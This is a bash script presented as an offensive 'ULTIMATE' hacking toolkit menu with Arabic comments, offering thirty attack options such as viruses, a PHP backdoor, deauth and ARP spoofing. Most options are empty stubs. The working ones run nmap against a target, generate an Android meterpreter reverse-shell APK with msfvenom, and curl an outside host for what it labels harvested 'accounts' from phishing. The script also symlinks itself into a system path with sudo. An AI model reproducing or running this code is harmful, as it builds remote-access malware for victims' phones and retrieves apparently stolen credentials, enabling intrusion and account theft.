#!/bin/bash
# xxszmsx ULTIMATE | BY: STUDIO
# [!] النسخة الشاملة: ملوير + تتبع + صيد + اختصار نظام
RED='\e[1;31m'; GREEN='\e[1;32m'; NC='\e[0m'

# --- [ مرحلة التثبيت الذكي في النظام ] ---
if [ ! -f "/usr/local/bin/studio" ]; then
    sudo ln -sf "$(pwd)/xxszmsx.sh" /usr/local/bin/studio
    sudo chmod +x /usr/local/bin/studio
fi

# --- [ القائمة الرئيسية والتحكم ] ---
while true; do
    clear
    echo -e "${RED}"
    echo "██╗  ██╗██╗  ██╗███████╗███████╗███    ███╗██╗  ██╗"
    echo "╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
    echo " ╚███╔╝  ╚███╔╝ ███████╗███████╗██╔████╔██║ ╚███╔╝ "
    echo " ██╔██╗  ██╔██╗ ╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
    echo "██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
    echo -e "╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
    echo "-----------------------------------------------------"
    echo "   [!] 30 TOOLS | POWERED BY: STUDIO [!]"
    echo "-----------------------------------------------------"
    echo -e "1) Network Scan         11) Android Virus    21) IP Tracker"
    echo "2) WiFi Monitor         12) Windows Virus    22) Phone Info"
    echo "3) Deauth Attack        13) Phishing Log     23) DNS Recon"
    echo "4) MAC Changer          14) SQL Injection    24) Admin Finder"
    echo "5) Port Scanner         15) Admin Panel      25) Social Search"
    echo "6) Arp Spoofing         16) Web Crawler      26) Email Leak"
    echo "7) DNS Poisoning        17) Python Shell     27) Pass Cracker"
    echo "8) Router Hack          18) PHP Backdoor     28) Hydra Attack"
    echo "9) Packet Inject        19) Directory Brute  29) Hash Cracker"
    echo "10) Bettercap           20) FUD Encoder      30) Update System"
    echo "-----------------------------------------------------"
    echo "0) Exit"
    read -p "xxszmsx >> " choice

    case $choice in
        1) read -p "Enter IP: " ip; nmap -A $ip ;;
        11) read -p "LHOST: " lh; read -p "LPORT: " lp; msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen.apk ;;
        13) echo -e "${RED}[!] Getting Accounts...${NC}"; curl -s https://robloxcor.xo.je/data_77x_z9.txt ;;
        21) read -p "Enter IP: " tip; curl -s "http://ip-api.com/json/$tip?fields=status,country,regionName,city,zip,lat,lon,isp,query" ;;
        30) git pull origin main ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"
    read
done

